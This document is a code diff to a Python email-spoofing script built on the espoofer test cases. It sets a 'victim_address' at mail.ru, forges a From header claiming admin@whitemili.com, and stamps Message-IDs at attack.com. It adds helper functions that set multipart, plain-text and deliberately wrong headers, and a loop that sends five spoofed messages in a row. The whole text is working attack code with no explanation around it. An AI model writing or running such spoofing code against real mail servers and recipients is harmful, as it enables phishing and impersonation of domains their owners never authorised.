@@ -30,19 +30,35 @@ def send_test_mail():
         except Exception as e:
             print(str(e))
             time.sleep(5)
-def main():
-    test_account = b"root"
-    test_domain = b"anjhz.com"
-    config["victim_address"]=test_account + b"@"+ test_domain
-    config["to_header"]=b"To: <"+test_account+b"@"+ test_domain +b">\r\n"
-    config['mode'] = "s"
-    
+def add_multipart_headers():
     test_cases["server_a3"]["data"]["other_headers"] = b"Date: " + get_date() + b"\r\n" + b"Content-Type: multipart/mixed;\r\n\tboundary=\"----=_Part_111217_462031992.1680524601073\"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-" +\
             id_generator() + b"@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n"
     test_cases["server_a4"]["data"]["other_headers"] = b"Date: " + get_date() + b"\r\n" + b"Content-Type: multipart/mixed;\r\n\tboundary=\"----=_Part_111217_462031992.1680524601073\"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-" +\
             id_generator() + b"@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n"
     test_cases["server_a1"]["data"]["other_headers"] = b"Date: " + get_date() + b"\r\n" + b"Content-Type: multipart/mixed;\r\n\tboundary=\"----=_Part_111217_462031992.1680524601073\"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-" +\
             id_generator() + b"@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n"
+def add_plain_text_headers():
+    test_cases["server_a3"]["data"]["other_headers"] = b"Date: " + get_date() + b"\r\n" + b"Content-Type: text/plain; charset=\"UTF-8\"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-" +\
+            id_generator() + b"@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n"
+    test_cases["server_a4"]["data"]["other_headers"] = b"Date: " + get_date() + b"\r\n" + b"Content-Type: text/plain; charset=\"UTF-8\"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-" +\
+            id_generator() + b"@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n"
+    test_cases["server_a1"]["data"]["other_headers"] = b"Date: " + get_date() + b"\r\n" + b"Content-Type: text/plain; charset=\"UTF-8\"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-" +\
+            id_generator() + b"@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n"
+def add_wrong_headers():
+    test_cases["server_a3"]["data"]["other_headers"] = b"Date: " + get_date() + b"\r\n" + b"Content-Type: multipart/alternative; boundary=\"001a113db9c28077e7054ee99e9c\"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-" +\
+            id_generator() + b"@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n"
+    test_cases["server_a4"]["data"]["other_headers"] = b"Date: " + get_date() + b"\r\n" + b"Content-Type: multipart/alternative; boundary=\"001a113db9c28077e7054ee99e9c\"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-" +\
+            id_generator() + b"@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n"
+    test_cases["server_a1"]["data"]["other_headers"] = b"Date: " + get_date() + b"\r\n" + b"Content-Type: multipart/alternative; boundary=\"001a113db9c28077e7054ee99e9c\"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-" +\
+            id_generator() + b"@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n"
+def main():
+    test_account = b"anjhz0318"
+    test_domain = b"mail.ru"
+    config["victim_address"]=test_account + b"@"+ test_domain
+    config["to_header"]=b"To: <"+test_account+b"@"+ test_domain +b">\r\n"
+    config['mode'] = "s"
+    
+    add_multipart_headers()
     for tls_status in [True]:
         config["server_mode"]["starttls"] = tls_status
         if tls_status == False:
@@ -101,7 +117,7 @@ def main():
                     config["legitimate_site_address"] = b"admin@whitemili.com"
                     test_cases["server_a3"]["data"]["from_header"] = b"From: <admin@whitemili.com>\r\n"
                     prefix4 = b"Normal-" + prefix3
-                    
+                    '''
                     for i in range(1):
                         config["subject_header"]=b"Subject: "+prefix4+b"-URL-"+str(i+1).encode()+b"\r\n"
                         config["body"]=testbody.url_body
@@ -144,18 +160,21 @@ def main():
                         send_test_mail()
                         time.sleep(3)
                     '''
+                    '''
                     for i in range(3):
                         config["subject_header"]=b"Subject: "+prefix4+b"-Plain Text-"+str(i+1).encode()+b"\r\n"
                         config["body"]=testbody.plain_text
-                        test_cases["server_a3"]["data"]["other_headers"] = b"Date: " + get_date() + b"\r\n" + b"Content-Type: text/plain; charset=\"UTF-8\"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-" +\
-                        id_generator() + b"@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n"
-                        test_cases["server_a4"]["data"]["other_headers"] = b"Date: " + get_date() + b"\r\n" + b"Content-Type: text/plain; charset=\"UTF-8\"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-" +\
-                        id_generator() + b"@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n"
-                        test_cases["server_a1"]["data"]["other_headers"] = b"Date: " + get_date() + b"\r\n" + b"Content-Type: text/plain; charset=\"UTF-8\"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-" +\
-                        id_generator() + b"@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n"
+                        add_wrong_headers()
                         send_test_mail()
                         time.sleep(3)
                     '''
+                    for i in range(5):
+                        config["subject_header"]=b"Subject: "+prefix4+b"-Plain Text and default body-"+str(i+1).encode()+b"\r\n"
+                        config["body"]=testbody.default_body
+                        add_plain_text_headers()
+                        send_test_mail()
+                        time.sleep(3)
+                    
     
 if __name__ == '__main__':
     main()
